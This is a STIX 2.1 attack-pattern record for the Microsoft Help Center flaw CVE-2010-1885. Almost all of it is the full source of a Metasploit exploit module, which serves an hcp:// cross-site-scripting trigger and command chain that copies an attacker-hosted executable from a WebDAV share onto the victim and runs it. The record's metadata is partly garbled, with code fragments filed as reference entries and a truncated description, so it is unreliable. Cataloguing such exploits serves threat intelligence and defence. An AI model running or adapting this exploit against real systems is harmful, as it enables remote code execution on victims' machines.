{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3e82ef09-c6fa-4f5a-81ae-7925502a69a8",
    "created": "2024-08-14T16:41:36.898538Z",
    "modified": "2024-08-14T16:41:36.898542Z",
    "name": "Microsoft Help Center XSS and Command Execution",
    "description": " Help and Support Center is the default application provided to access online documentation for Microsoft Windows. Microsoft supports accessing help documents",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms10_042_helpctr_xss_cmd_exec.rb",
            "external_id": "ms10_042_helpctr_xss_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1885"
        },
        {
            "source_name": "asx.gsub!(/URLBASE/",
            "external_id": "@url_base)"
        },
        {
            "source_name": "html.gsub!(/URLBASE/",
            "external_id": "@url_base)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t\t=> 'Microsoft Help Center XSS and Command Execution',\n      'Description'\t=> %q{\n          Help and Support Center is the default application provided to access online\n        documentation for Microsoft Windows. Microsoft supports accessing help documents\n        directly via URLs by installing a protocol handler for the scheme \"hcp\". Due to\n        an error in validation of input to hcp:// combined with a local cross site\n        scripting vulnerability and a specialized mechanism to launch the XSS trigger,\n        arbitrary command execution can be achieved.\n\n        On IE7 on XP SP2 or SP3, code execution is automatic. If WMP9 is installed, it\n        can be used to launch the exploit automatically. If IE8 and WMP11, either can\n        be used to launch the attack, but both pop dialog boxes asking the user if\n        execution should continue. This exploit detects if non-intrusive mechanisms are\n        available and will use one if possible. In the case of both IE8 and WMP11, the\n        exploit defaults to using an iframe on IE8, but is configurable by setting the\n        DIALOGMECH option to \"none\" or \"player\".\n\n        This module creates a WebDAV service from which the payload is copied to the\n        victim machine.\n      },\n      'Author'\t\t=>\n        [\n          'Tavis Ormandy',  # Original discovery\n          'natron'          # Metasploit version\n        ],\n      'License'\t\t=> MSF_LICENSE,\n      'References'\t=>\n        [\n          [ 'CVE', '2010-1885' ],\n          [ 'OSVDB', '65264' ],\n          [ 'MSB', 'MS10-042']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'\t\t=>\n        {\n          'Space'\t=> 2048,\n        },\n      'Platform'\t\t=> 'win',\n      'Targets'\t\t=>\n        [\n          [ 'Automatic',\t{ } ]\n        ],\n      'DisclosureDate' => '2010-06-09',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new(\t'SRVPORT',\t\t [ true,  \"The daemon port to listen on (do not change)\", 80 ]),\n        OptString.new(\t'URIPATH',\t\t [ true,  \"The URI to use (do not change).\", \"/\" ]),\n        OptString.new(\t'DIALOGMECH',\t [ true, \"IE8/WMP11 trigger mechanism (none, iframe, or player).\", \"iframe\"])\n      ])\n\n    deregister_options('SSL', 'SSLVersion') # Just for now\n  end\n\n  def on_request_uri(cli, request)\n\n    # If there is no subdirectory in the request, we need to redirect.\n    if (request.uri == '/') or not (request.uri =~ /\\/[^\\/]+\\//)\n      if (request.uri == '/')\n        subdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'\n      else\n        subdir = request.uri + '/'\n      end\n      print_status(\"Request for \\\"#{request.uri}\\\" does not contain a sub-directory, redirecting to #{subdir} ...\")\n      send_redirect(cli, subdir)\n      return\n    end\n\n\n    case request.method\n    when 'OPTIONS'\n      process_options(cli, request)\n    when 'PROPFIND'\n      process_propfind(cli, request)\n    when 'GET'\n      process_get(cli, request)\n    else\n      print_error(\"Unexpected request method encountered: #{request.method}\")\n    end\n\n  end\n\n  def process_get(cli, request)\n\n    @my_host   = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    webdav_loc = \"\\\\\\\\#{@my_host}\\\\#{@random_dir}\\\\#{@payload}\"\n    @url_base  = \"http://\" + @my_host\n\n    if (Regexp.new(Regexp.escape(@payload)+'$', Regexp::IGNORECASE).match(request.uri))\n      print_status \"Sending payload executable to target ...\"\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_exe({ :code => p.encoded })\n\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    if request.uri.match(/\\.gif$/)\n      # \"world's smallest gif\"\n      data  = \"GIF89a\\x01\\x00\\x01\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00!\\xF9\\x04\\x01\"\n      data += \"\\x00\\x00\\x00\\x00,\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x02\\x02D\\x01\\x00;\"\n      print_status \"Sending gif image to WMP\"\n      send_response(cli, data, { 'Content-TYpe' => 'image/gif' } )\n    end\n\n    # ASX Request Inbound\n    if request.uri.match(/\\.asx$/)\n      asx = %Q|<ASX VERSION=\"3.0\">\n<PARAM name=\"HTMLView\" value=\"URLBASE/STARTHELP\"/>\n<ENTRY>\n  <REF href=\"URLBASE/IMGFILE\"/>\n</ENTRY>\n</ASX>\n|\n      asx.gsub!(/URLBASE/, @url_base)\n      asx.gsub!(/STARTHELP/, @random_dir + \"/\" + @start_help)\n      asx.gsub!(/IMGFILE/, @random_dir + \"/\" + @img_file)\n      print_status(\"Sending asx file\")\n      send_response(cli, asx, { 'Content-Type' => 'text/html' })\n      return\n    end\n\n    # iframe request inbound from either WMP or IE7\n    if request.uri.match(/#{@start_help}/)\n\n      help_html = <<-EOS\n<iframe src=\"hcp://services/search?query=a&topic=hcp://system/sysinfo/sysinfomain.htm%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF%uFFFF..%5C..%5Csysinfomain.htm%u003fsvr=%3Cscript%20defer%3Eeval%28unescape%28%27COMMANDS%27%29%29%3C/script%3E\">\nEOS\n\n      rand_vbs\t= rand_text_alpha(rand(2)+1) + \".vbs\"\n      copy_launch = %Q^cmd /c copy #{webdav_loc} %TEMP% && %TEMP%\\\\#{@payload}^\n      vbs_content = %Q|WScript.CreateObject(\"WScript.Shell\").Run \"#{copy_launch}\",0,false|\n      write_vbs\t= %Q|cmd /c echo #{vbs_content}>%TEMP%\\\\#{rand_vbs}|\n      launch_vbs  = %Q|cscript %TEMP%\\\\#{rand_vbs}>nul|\n      concat_cmds = \"#{write_vbs}|#{launch_vbs}\"\n\n      eval_block  = \"Run(String.fromCharCode(#{convert_to_char_code(concat_cmds)}));\"\n      eval_block = Rex::Text.uri_encode(Rex::Text.uri_encode(eval_block))\n      help_html.gsub!(/COMMANDS/, eval_block)\n      print_status(\"Sending exploit trigger\")\n      send_response(cli, help_html, { 'Content-Type' => 'text/html' })\n      return\n    end\n\n    # default initial response\n    js = %Q|\nvar asx = \"URLBASE/ASXFILE\";\nvar ifr = \"URLBASE/IFRFILE\";\n\nfunction launchiframe(src) {\n  var o = document.createElement(\"IFRAME\");\n  o.setAttribute(\"width\",\"0\");\n  o.setAttribute(\"height\",\"0\");\n  o.setAttribute(\"frameborder\",\"0\");\n  o.setAttribute(\"src\",src);\n  document.body.appendChild(o);\n}\n\nif (window.navigator.appName == \"Microsoft Internet Explorer\") {\n  var ua = window.navigator.userAgent;\n  var re  = new RegExp(\"MSIE ([0-9]{1,}[\\.0-9]{0,})\");\n  re.exec(ua)\n  ver = parseFloat( RegExp.$1 );\n\n  // if ie8, check WMP version\n  if (ver > 7) {\n    var o = document.createElement(\"OBJECT\");\n    o.setAttribute(\"classid\", \"clsid:6BF52A52-394A-11d3-B153-00C04F79FAA6\");\n    o.setAttribute(\"uiMode\", \"invisible\");\n    // if wmp9, go ahead and launch\n    if( parseInt(o.versionInfo) < 10 ) {\n      o.openPlayer(asx);\n    // if > wmp9, only launch if user requests\n    } else {\n      DIALOGMECH\n    }\n  // if ie7, use iframe\n  } else {\n    launchiframe(ifr);\n  }\n} else {\n  // if other, try iframe\n  launchiframe(ifr);\n}\n|\n\n    html = %Q|<html>\n<head></head><body><script>JAVASCRIPTFU\n</script>\n</body>\n</html>\n|\n    case datastore['DIALOGMECH']\n    when \"player\"\n      mech = \"o.openPlayer(asx);\"\n    when \"iframe\"\n      mech = \"launchiframe(ifr);\"\n    when \"none\"\n      mech = \"\"\n    else\n      mech = \"\"\n    end\n\n    html.gsub!(/JAVASCRIPTFU/, js)\n    html.gsub!(/DIALOGMECH/, mech)\n    html.gsub!(/URLBASE/, @url_base)\n    html.gsub!(/ASXFILE/, @random_dir + \"/\" + @asx_file)\n    html.gsub!(/IFRFILE/, @random_dir + \"/\" + @start_help)\n\n    print_status(\"Sending #{self.name}\")\n\n    headers = {\n      'Content-Type'\t\t=> 'text/html',\n      #'X-UA-Compatible'\t=> 'IE=7'\n    }\n\n    send_response(cli, html, headers)\n  end\n\n  #\n  # OPTIONS requests sent by the WebDav Mini-Redirector\n  #\n  def process_options(cli, request)\n    print_status(\"Responding to WebDAV OPTIONS request\")\n    headers = {\n      #'DASL'   => '<DAV:sql>',\n      #'DAV'    => '1, 2',\n      'Allow'  => 'OPTIONS, GET, PROPFIND',\n      'Public' => 'OPTIONS, GET, PROPFIND'\n    }\n    send_response(cli, '', headers)\n  end\n\n  def convert_to_char_code(str)\n    return str.unpack('H*')[0].gsub(Regexp.new(\".{#{2}}\", Regexp::NOENCODING)) { |s| s.hex.to_s + \",\" }.chop\n  end\n  #\n  # PROPFIND requests sent by the WebDav Mini-Redirector\n  #\n  def process_propfind(cli, request)\n    path = request.uri\n    print_status(\"Received WebDAV PROPFIND request\")\n    body = ''\n\n    if Regexp.new(Regexp.escape(@payload)+'$', Regexp::IGNORECASE).match(path)\n      # Response for the EXE\n      print_status(\"Sending EXE multistatus for #{path} ...\")\n#<lp1:getcontentlength>45056</lp1:getcontentlength>\n      body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>\n<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>\n<lp1:getetag>\"39e0132-b000-43c6e5f8d2f80\"</lp1:getetag>\n<lp2:executable>F</lp2:executable>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n    elsif (path =~ /\\.manifest$/i) or (path =~ /\\.config$/i) or (path =~ /\\.exe/i)\n      print_status(\"Sending 404 for #{path} ...\")\n      send_not_found(cli)\n      return\n\n    elsif (path =~ /\\/$/) or (not path.sub('/', '').index('/'))\n      # Response for anything else (generally just /)\n      print_status(\"Sending directory multistatus for #{path} ...\")\n      body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>\n<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>\n<lp1:getetag>\"39e0001-1000-4808c3ec95000\"</lp1:getetag>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n\n    else\n      print_status(\"Sending 404 for #{path} ...\")\n      send_not_found(cli)\n      return\n    end\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  def exploit\n    @random_dir = rand_text_alpha(rand(2)+1)\n    @asx_file\t= rand_text_alpha(rand(2)+1) + \".asx\"\n    @start_help\t= rand_text_alpha(rand(2)+1) + \".html\"\n    @payload\t= rand_text_alpha(rand(2)+1) + \".exe\"\n    @img_file\t= rand_text_alpha(rand(2)+1) + \".gif\"\n\n    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'\n      fail_with(Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')\n    end\n\n    super\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2010-06-09",
    "x_mitre_platforms": [
        "win'"
    ]
}